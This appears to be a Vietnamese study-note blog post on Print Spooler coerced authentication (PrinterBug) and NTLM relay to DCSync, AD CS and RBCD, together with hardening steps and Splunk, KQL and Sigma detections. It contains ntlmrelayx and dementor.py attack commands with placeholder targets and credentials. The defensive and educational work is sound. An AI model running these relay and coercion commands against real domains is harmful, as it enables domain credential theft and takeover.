---
layout: post
title: "Print Spooler & NTLM Relaying"
date: 2026-07-13 22:28:18 +0700
categories: ["Windows Attacks & Defense", "Detection & Monitoring"]
tags: [active-directory, windows-attacks-defense, print-spooler, printerbug, ntlm-relay, ntlmrelayx, dcsync, smb-signing, unconstrained-delegation, adcs, rbcd, event-4624, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Tóm tắt Print Spooler & NTLM Relaying: PrinterBug, coerced authentication, NTLM relay tới DCSync/AD CS/RBCD, prevention và detection bằng logon-source correlation."
toc: true
---

# Print Spooler & NTLM Relaying

Bài này thuộc module **Windows Attacks & Defense**, tập trung vào việc lạm dụng Print Spooler để ép máy Windows xác thực tới hệ thống do attacker kiểm soát, sau đó relay NTLM authentication sang dịch vụ khác.

```text
Mục tiêu: hiểu PrinterBug, coerced authentication, điều kiện NTLM relay,
rủi ro với Domain Controller và cách phát hiện bằng source-IP correlation.
```

> Chỉ thực hành trong HTB, lab hoặc hệ thống có ủy quyền rõ ràng. Không ép xác thực hoặc relay credential ngoài phạm vi được phép.

---

## Timeline cập nhật

```text
Created at: 2026-07-13 22:28:18 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Windows Attacks & Defense
Section: Print Spooler & NTLM Relaying
Focus: PrinterBug, NTLM relay, SMB signing, DCSync, AD CS, RBCD, Event ID 4624
```

---

# 1. Print Spooler là gì?

**Print Spooler** là dịch vụ Windows xử lý tác vụ in và quản lý printer queues. Dịch vụ này tồn tại lâu đời và thường được bật mặc định trên nhiều máy Windows Desktop/Server.

PrinterBug liên quan đến các RPC function:

```text
RpcRemoteFindFirstPrinterChangeNotification
RpcRemoteFindFirstPrinterChangeNotificationEx
```

Các function này có thể bị lạm dụng để ép remote machine kết nối ngược tới một host khác.

---

# 2. Coerced Authentication

Khi PrinterBug bị trigger:

```text
1. Attacker gọi RPC tới Print Spooler.
2. Target machine kết nối ngược tới attacker-controlled host.
3. Target gửi NTLM authentication material.
4. Attacker relay authentication sang service khác.
```

Điểm quan trọng:

```text
Attacker không cần biết password của computer account bị ép xác thực.
```

---

# 3. Vì sao Domain Controller bật Spooler là nguy hiểm?

Nếu Domain Controller bật Print Spooler, attacker có thể ép DC account xác thực ra ngoài.

Các abuse path thường gặp:

- Relay sang DC khác để DCSync.
- Ép DC kết nối tới server có Unconstrained Delegation.
- Relay tới Active Directory Certificate Services.
- Relay để cấu hình Resource-Based Constrained Delegation.
- Relay tới SMB/LDAP/HTTP service phù hợp.

---

# 4. Attack Path 1 - Relay sang DCSync

Điều kiện quan trọng:

```text
SMB Signing trên target không được bắt buộc.
```

Flow:

```text
1. NTLMRelayx chờ connection.
2. PrinterBug ép DC1$ xác thực tới relay server.
3. Relay server chuyển authentication sang DC2.
4. DC2 chấp nhận authentication.
5. Relay thực hiện DCSync.
6. Credential material bị dump.
```

---

# 5. NTLMRelayx trong lab

Ví dụ:

```bash
impacket-ntlmrelayx   -t dcsync://<TARGET_DC_IP>   -smb2support
```

Tool sẽ:

- Dựng SMB server.
- Chờ inbound authentication.
- Relay authentication tới target.
- Thử DCSync nếu điều kiện phù hợp.

---

# 6. Trigger PrinterBug

Trong HTB lab có thể dùng Dementor:

```bash
python3 dementor.py   <ATTACKER_IP>   <TARGET_DC_IP>   -u <DOMAIN_USER>   -d <DOMAIN>   -p '<PASSWORD>'
```

Trong bài public nên thay IP/credential thật bằng placeholder.

Lỗi kiểu:

```text
RPC_S_INVALID_NET_ADDR
```

không nhất thiết có nghĩa coerced authentication không xảy ra; cần kiểm tra listener và network telemetry.

---

# 7. Những abuse path khác

## Unconstrained Delegation

DC bị ép xác thực tới host có Unconstrained Delegation:

```text
TGT của DC có thể bị cache trong memory của UD server.
```

## Active Directory Certificate Services

Relay tới AD CS có thể cấp certificate cho DC account, sau đó certificate có thể bị dùng để authenticate như DC.

## Resource-Based Constrained Delegation

Relay authentication có thể bị dùng để cấu hình RBCD cho target computer object, sau đó impersonate privileged user tới máy đó.

---

# 8. Prevention

Biện pháp ưu tiên:

```text
Disable Print Spooler trên mọi server không cần chức năng in.
```

Đặc biệt:

- Domain Controllers.
- Tier-0 servers.
- Certificate Authorities.
- Identity-management servers.
- Backup servers.

PowerShell:

```powershell
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled
```

---

# 9. Chặn Remote Spooler RPC

Nếu vẫn cần Spooler cục bộ, có thể chặn remote RPC endpoint bằng policy/registry.

Registry path:

```text
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers
```

Value:

```text
RegisterSpoolerRemoteRpcEndPoint
```

Ý nghĩa:

```text
1 = bật remote RPC endpoint
2 = tắt remote RPC endpoint
```

Cần test compatibility trước khi triển khai diện rộng.

---

# 10. SMB Signing

Bật SMB signing giúp giảm khả năng NTLM relay tới SMB.

Policy:

```text
Microsoft network server: Digitally sign communications (always)
```

SMB signing nên bắt buộc trên Domain Controllers và critical servers.

---

# 11. Network Segmentation và Egress Filtering

Nên hạn chế outbound SMB từ server:

```text
TCP 445
TCP 139
```

Ngoại lệ cần kiểm soát:

- DC-to-DC communication.
- File servers hợp lệ.
- Backup/management systems.
- Các luồng replication cần thiết.

Blocked outbound SMB từ Tier-0 server tới workstation là high-value alert.

---

# 12. Detection bằng Event ID 4624

Trong relay scenario, có thể không xuất hiện Event ID 4662 DCSync như thông thường.

Detection có thể dựa vào:

```text
Event ID 4624 - Successful logon
```

Ví dụ đáng ngờ:

```text
Account: DC1$
Source IP: relay host
Target: DC2
Logon Type: 3
```

Điểm bất thường:

```text
Computer account của DC đăng nhập từ IP không phải IP của chính DC đó.
```

---

# 13. Core Infrastructure Source Correlation

Một detection tốt cần baseline mapping:

| Account | Expected Source |
|---|---|
| DC1$ | IP của DC1 |
| DC2$ | IP của DC2 |
| CA01$ | IP của CA01 |
| BackupSvc | Backup server |
| Tier-0 admin | PAW/jump host |

Nếu `DC1$` logon từ IP workstation/Kali:

```text
High-confidence alert
```

---

# 14. Splunk Detection

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=3
| eval src=coalesce(Source_Network_Address,IpAddress)
| where like(Account_Name, "%$")
| lookup dc_account_ip_map account as Account_Name OUTPUT expected_ip
| where isnotnull(expected_ip) AND src!=expected_ip
| table _time, host, Account_Name, src, expected_ip, Authentication_Package
```

Nếu chưa có lookup:

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=3
Account_Name="DC1$"
| stats count values(host) as targets by Source_Network_Address
```

---

# 15. ELK/KQL Detection

```kql
event.code: "4624"
and winlog.event_data.LogonType: "3"
and user.name: "DC1$"
```

Sau đó correlate `source.ip` với CMDB/asset inventory.

---

# 16. Sigma Rule

```yaml
title: Domain Controller Computer Account Logon From Unexpected Source
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    TargetUserName|endswith: '$'
  condition: selection
falsepositives:
  - Legitimate domain-controller communication
  - Backup or management systems
level: high
```

Sigma không tự biết expected IP, nên correlation nên thực hiện trong SIEM hoặc SOAR.

---

# 17. Network Detection

PrinterBug/NTLM relay có thể tạo:

- RPC tới spoolss.
- Inbound SMB tới relay host.
- Outbound SMB từ server/DC.
- LDAP/SMB/HTTP relay tới critical server.
- DCSync-like directory replication traffic.

Nguồn telemetry:

- Zeek.
- Suricata.
- Firewall.
- NetFlow.
- EDR network events.
- Windows Firewall logs.

---

# 18. Honeypot / Deception

Một cách phòng thủ chủ động:

```text
Block outbound SMB từ servers tới user networks.
Alert mọi blocked attempt.
```

Nếu PrinterBug bị trigger, reverse connection bị chặn nhưng vẫn tạo detection signal.

Điều kiện triển khai:

- Có inventory tốt.
- Có allowlist hợp lệ.
- Có khả năng response nhanh.
- Không làm gián đoạn DC replication.
- Không biến honeypot thành attack path thật.

---

# 19. Incident Response Checklist

```text
[ ] Xác định target có bật Print Spooler không.
[ ] Xác định source RPC trigger.
[ ] Xác định outbound SMB connection.
[ ] Review Event ID 4624 trên target relay destination.
[ ] Correlate computer account với expected source IP.
[ ] Kiểm tra SMB signing.
[ ] Hunt DCSync/AD CS/RBCD abuse.
[ ] Disable Spooler trên Tier-0 server.
[ ] Isolate relay source.
[ ] Rotate credential/certificate nếu bị compromise.
[ ] Review lateral movement và persistence.
```

---

# 20. Mapping với CDSA

## Security Operations & Monitoring

- Monitor 4624 Logon Type 3.
- Correlate machine account với CMDB IP.
- Alert outbound SMB từ Tier-0.
- Monitor spoolss RPC.

## Incident Response & Forensics

- Triage relay source.
- Review network flow.
- Hunt NTLMRelayx/Dementor artifacts.
- Xác định credential/certificate bị cấp.

## Threat Hunting

- Hunt machine account từ IP bất thường.
- Hunt DC SMB egress.
- Hunt AD CS enrollment từ nonstandard source.
- Hunt RBCD attribute changes.

## Detection Engineering

- Sigma cho computer-account logon.
- Splunk lookup với expected DC IP.
- Zeek/Suricata correlation.
- SOAR playbook disable Spooler/isolate source.

---

# 21. Lab Setup

Môi trường tối thiểu:

```text
2 Domain Controllers
1 Windows workstation
1 Linux attack host
1 Splunk/ELK/Wazuh server
Sysmon + Windows Event Forwarding/agent
Firewall/Zeek/Suricata visibility
```

Log nên thu:

```text
Security: 4624, 4662, 4768, 4769, 5136
Sysmon: 1, 3
PowerShell Operational
Windows Firewall logs
Zeek SMB/RPC logs
```

---

# Key Takeaway

```text
PrinterBug ép remote machine xác thực ra ngoài qua Print Spooler RPC.
NTLMRelayx có thể relay authentication sang SMB/LDAP/AD CS/DCSync path.
Domain Controller bật Spooler làm tăng attack surface Tier-0.
Detection chính là machine-account logon từ source IP không hợp lệ.
Prevention tốt nhất là disable Spooler trên server không cần in, bật SMB signing và kiểm soát outbound SMB.
```

Print Spooler & NTLM Relaying là ví dụ rõ ràng cho CDSA: một tính năng hợp lệ của Windows trở thành attack path khi identity, network controls và protocol hardening không được triển khai đồng bộ.
